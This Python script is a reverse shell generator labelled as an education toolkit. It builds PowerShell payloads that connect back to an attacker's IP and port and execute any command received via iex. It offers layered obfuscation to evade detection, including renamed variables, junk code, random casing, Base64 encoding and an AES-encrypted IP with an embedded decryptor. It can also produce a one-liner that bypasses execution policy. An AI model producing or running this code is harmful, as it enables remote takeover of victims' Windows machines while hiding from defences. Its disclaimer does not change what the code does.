import argparse
import textwrap
import sys
import socket
import random
import base64
import os
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ========================
#    CONFIGURATION
# ========================
VERSION = "1.3"
AUTHOR = "CyberSec Education Toolkit"
BANNER = f"""
\033[1;36m
██╗░░██╗██████╗░██╗░░░░░░█████╗░  ███████╗██╗░░██╗███████╗██╗░░░░░
██║░██╔╝██╔══██╗██║░░░░░██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░
█████═╝░██████╔╝██║░░░░░███████║  █████╗░░███████║█████╗░░██║░░░░░
██╔═██╗░██╔═══╝░██║░░░░░██╔══██║  ██╔══╝░░██╔══██║██╔══╝░░██║░░░░░
██║░╚██╗██║░░░░░███████╗██║░░██║  ██║░░░░░██║░░██║███████╗███████╗
╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚══════╝

Version: {VERSION} | {AUTHOR}
\033[0m
"""

# ========================
#    OBFUSCATION ENGINE
# ========================
class ObfuscationEngine:
    @staticmethod
    def random_case(text):
        """Randomize the casing of a string."""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in text)

    @staticmethod
    def encode_base64(text):
        """Encode a string in Base64."""
        return base64.b64encode(text.encode()).decode()

    @staticmethod
    def generate_junk_code():
        """Generate realistic-looking junk code."""
        junk_ops = [
            f"${random.choice(['tmp','buf','data'])}{random.randint(1000,9999)} = {random.randint(0,1024)}",
            f"# Diagnostics: {os.urandom(6).hex()}",
            f"Get-Process | Out-Null",
            f"[System.Net.Dns]::GetHostEntry([string]::Empty) | Out-Null",
            f"Start-Sleep -Milliseconds {random.randint(1,50)}"
        ]
        return '\n'.join(random.choices(junk_ops, k=5)) + '\n'

    @staticmethod
    def random_identifier(length=9):
        """Generate random variable/function names."""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        return ''.join(random.choice(chars) for _ in range(length))

# ========================
#    PAYLOAD GENERATOR
# ========================
def generate_powershell_reverse(ip, port, obf_level=0):
    """
    Generate a PowerShell reverse shell payload with optional obfuscation.
    For level 3, we embed a simple AES-based decryption routine in the script.
    """

    # Base template
    template = textwrap.dedent(f"""
    $c=New-Object System.Net.Sockets.TCPClient("{ip}",{port})
    $s=$c.GetStream()
    [byte[]]$b=0..65535|%{{0}}
    while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
        $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
        $r=(iex $d 2>&1 | Out-String )
        $a=([text.encoding]::ASCII).GetBytes($r)
        $s.Write($a,0,$a.Length)
        $s.Flush()
    }}
    $c.Close()
    """).strip()

    # Level 1: Variable renaming and junk code
    if obf_level >= 1:
        vars = {'c', 's', 'b', 'd', 'r', 'a'}
        replacements = {var: ObfuscationEngine.random_identifier() for var in vars}
        for old, new in replacements.items():
            template = template.replace(old, new)
        template = ObfuscationEngine.generate_junk_code() + template

    # Level 2: Base64 encoding and random casing
    if obf_level >= 2:
        template = ObfuscationEngine.random_case(template)
        ip_encoded = ObfuscationEngine.encode_base64(ip)
        template = template.replace(
            ip,
            f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{ip_encoded}'))"
        )

    # Level 3: AES encryption for the IP, plus an embedded PowerShell decrypt function
    if obf_level >= 3:
        # Generate AES key & IV
        aes_key = secrets.token_bytes(16)  # 128-bit key
        aes_iv = secrets.token_bytes(16)   # 128-bit IV

        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        enc_ip_bytes = cipher.encrypt(pad(ip.encode(), AES.block_size))
        enc_ip_b64 = base64.b64encode(enc_ip_bytes).decode()

        # Encode key and IV to base64
        key_b64 = base64.b64encode(aes_key).decode()
        iv_b64  = base64.b64encode(aes_iv).decode()

        # Minimal AES decrypt function in PowerShell:
        decrypt_function = textwrap.dedent(f"""
        function Decrypt-AES($encB64, $keyB64, $ivB64) {{
            $enc = [Convert]::FromBase64String($encB64)
            $key = [Convert]::FromBase64String($keyB64)
            $iv  = [Convert]::FromBase64String($ivB64)
            $aes = New-Object System.Security.Cryptography.RijndaelManaged
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = $key
            $aes.IV = $iv
            $decrypter = $aes.CreateDecryptor()
            $out = $decrypter.TransformFinalBlock($enc,0,$enc.Length)
            $aes.Dispose()
            return ([System.Text.Encoding]::UTF8.GetString($out))
        }}
        """)

        # Replace the plaintext IP with the call to Decrypt-AES
        template = template.replace(
            ip,
            f"$([string](Decrypt-AES '{enc_ip_b64}' '{key_b64}' '{iv_b64}'))"
        )

        # Prepend the decrypt function to the script
        template = decrypt_function + "\n" + template

        # Print out the key info for demonstration
        print(f"\n\033[1;33m[!] AES Key: {key_b64}\n[!] AES IV:  {iv_b64}\033[0m")

    return template

def convert_to_oneliner(script):
    """
    Convert the multi-line PowerShell script into a single line
    suitable for quick copy/paste or inline usage.
    """
    lines = [l.strip() for l in script.splitlines() if l.strip()]
    # Separate each line with semicolons
    oneliner = "; ".join(lines)
    # Optionally wrap in a powershell.exe call:
    return f"powershell -NoProfile -ExecutionPolicy Bypass -Command \"{oneliner}\""

# ========================
#    MAIN INTERFACE
# ========================
def print_help():
    help_text = f"""
    {BANNER}
    
    \033[1;34mUSAGE:\033[0m
      python {sys.argv[0]} -i IP -p PORT [-o OUTPUT] [--obfuscate LEVEL] [--oneliner]

    \033[1;34mCORE FUNCTIONALITY:\033[0m
      \033[1;32m-i, --ip IP\033[0m
          Attacker IP address (required)
          Example: 192.168.1.10

      \033[1;32m-p, --port PORT\033[0m
          TCP port number (1-65535)

      \033[1;32m-o, --output OUTPUT\033[0m
          Save payload to file (without extension)

      \033[1;32m--obfuscate LEVEL\033[0m
          Obfuscation level (0-3):
            0 - No obfuscation
            1 - Basic (variable renaming, junk code)
            2 - Medium (string encoding, random casing)
            3 - High (AES encryption, embedded key & decrypt function)

      \033[1;32m--oneliner\033[0m
          Produce a single-line PowerShell command (instead of multi-line)

    \033[1;31mSECURITY NOTICE:\033[0m
      This tool is for authorized security testing and educational purposes only.
      Unauthorized use against computer systems is illegal and unethical.
    """
    print(textwrap.dedent(help_text))

def validate_target(ip, port):
    try:
        socket.inet_aton(ip)
    except socket.error:
        raise ValueError(f"Invalid IP address: {ip}")
    
    if not 1 <= port <= 65535:
        raise ValueError(f"Invalid port number: {port}")

def main():
    if '--help' in sys.argv or '-h' in sys.argv:
        print_help()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description="PowerShell Reverse Shell Generator",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage="python %(prog)s -i IP -p PORT [-o OUTPUT] [--obfuscate LEVEL] [--oneliner]"
    )
    parser.add_argument('-i', '--ip', required=True, help='Attacker IP address')
    parser.add_argument('-p', '--port', type=int, required=True, help='TCP port number')
    parser.add_argument('-o', '--output', help='Save payload to file (without extension)')
    parser.add_argument('--obfuscate', type=int, choices=[0, 1, 2, 3], default=0,
                        help='Obfuscation level (0-3)')
    parser.add_argument('--oneliner', action='store_true', default=False,
                        help='Produce a single-line PowerShell command')
    parser.add_argument('--help', action='store_true', help='Show help message')

    try:
        args = parser.parse_args()
    except SystemExit:
        print_help()
        sys.exit(1)

    if args.help:
        print_help()
        sys.exit(0)

    try:
        validate_target(args.ip, args.port)
        payload = generate_powershell_reverse(args.ip, args.port, args.obfuscate)

        if args.oneliner:
            payload = convert_to_oneliner(payload)

        if args.output:
            filename = f"{args.output}.ps1"
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"\n[+] Payload saved to \033[1;32m{filename}\033[0m")
        else:
            print("\n\033[1;34m[ Generated Payload ]\033[0m")
            print(payload)

    except Exception as e:
        print(f"\n\033[1;31m[!] Critical Error: {str(e)}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()